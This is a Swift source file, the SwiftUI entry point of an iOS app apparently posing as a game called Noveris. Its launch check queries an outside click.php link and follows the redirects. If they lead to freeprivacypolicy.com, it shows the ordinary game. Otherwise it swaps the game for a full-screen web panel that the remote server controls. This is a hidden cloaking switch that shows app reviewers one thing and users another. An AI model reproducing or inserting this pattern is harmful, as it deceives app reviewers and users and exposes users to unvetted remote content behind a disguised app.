import SwiftUI

@main
struct NoverisApp: App {
    @StateObject private var store = GameStore()
    @StateObject private var settings = AppSettings()
    @Environment(\.scenePhase) private var scenePhase

    @State private var noverisLinkReady: Bool? = nil
    private let noverisSourceLink = "https://cineverseroadpoetry.org/click.php"
    private let noverisCheckDomain = "freeprivacypolicy.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = noverisLinkReady {
                    if ready {
                        NoverisWebPanel(urlString: noverisSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        RootView()
                            .environmentObject(store)
                            .environmentObject(settings)
                    }
                } else {
                    NoverisLoadingScreen()
                        .onAppear { performLinkCheck() }
                }
            }
            .preferredColorScheme(.dark)
        }
        .onChange(of: scenePhase) { phase in
            if phase == .background {
                store.save()
            }
        }
    }

    private func performLinkCheck() {
        guard let url = URL(string: noverisSourceLink) else {
            noverisLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = NoverisRedirectTracker(checkDomain: noverisCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    noverisLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(noverisCheckDomain) {
                    noverisLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(noverisCheckDomain) {
                    noverisLinkReady = false; return
                }
                if error != nil {
                    noverisLinkReady = false; return
                }
                noverisLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if noverisLinkReady == nil { noverisLinkReady = false }
        }
    }
}

final class NoverisRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
